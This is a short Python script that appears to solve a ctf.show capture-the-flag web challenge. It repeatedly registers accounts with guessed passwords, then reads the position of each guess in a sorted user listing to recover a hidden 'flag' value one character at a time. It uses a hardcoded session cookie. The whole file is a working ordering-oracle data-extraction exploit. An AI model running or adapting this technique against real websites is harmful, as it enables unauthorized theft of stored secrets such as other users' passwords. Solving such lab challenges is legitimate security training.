import requests
url="http://d6de054a-781e-4910-976b-5b236140d353.challenge.ctf.show/user_main.php?order=3"
headers = {"cookie": "PHPSESSID=b7fbe90eedaf98d734e1ad346d897c6e"}
str='-0123456789abcdefghijklmnopqrstuvwxyz{|}'
flag=""
for i in range(48):
    for j in range(0,len(str)):
        index=flag+str[j]
        data={
            'username':'whb',
            'email':'123',
            'nickname':'123',
            'password':index
        }
        t=requests.post("http://d6de054a-781e-4910-976b-5b236140d353.challenge.ctf.show/reg.html",data=data,timeout=1)
        t=requests.get(url,headers=headers,timeout=1).text
        if t.find(f"<td>{index}</td>")>t.find("<td>flag</td>"):
            flag=flag+str[j-1]
            print(flag)
            break
